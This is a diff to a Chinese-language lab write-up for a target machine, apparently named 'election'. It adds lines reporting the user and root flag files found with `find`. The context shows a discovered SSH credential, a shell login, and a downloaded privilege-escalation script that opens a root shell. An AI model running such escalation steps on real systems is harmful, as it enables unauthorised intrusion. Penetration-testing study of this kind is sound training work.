@@ -101,7 +101,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 	SSH         192.168.202.211 22     192.168.202.211  [+] love:P@$$w0rd@123  Linux - Shell access!
 	```
 >
-- 使用 `ssh` 成功登入
+- 使用 `ssh` 成功登入，並找到 `local.txt` 
 
 	```bash
 	┌──(kali㉿kali)-[~]
@@ -117,6 +117,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 	
 	love@election:~$ whoami
 	love
+	love@election:~$ find / -type f -name local.txt 2>/dev/null
+	/home/love/local.txt
 	```
 
 # 提權
@@ -151,7 +153,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 	........
 	```
 >
-- 下載腳本並在目標端執行，成功取得 `root` 權限
+- 下載腳本並在目標端執行，成功取得 `root` 權限，並找到 `proof.txt` 
 	
 	```bash
 	┌──(kali㉿kali)-[~/Desktop]
@@ -174,6 +176,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 	[*] Launching root shell: /tmp/sh
 	sh-4.4# whoami
 	root
+	sh-4.4# find / -type f -name proof.txt 2>/dev/null
+	/root/proof.txt
 	```
 
 # 補充
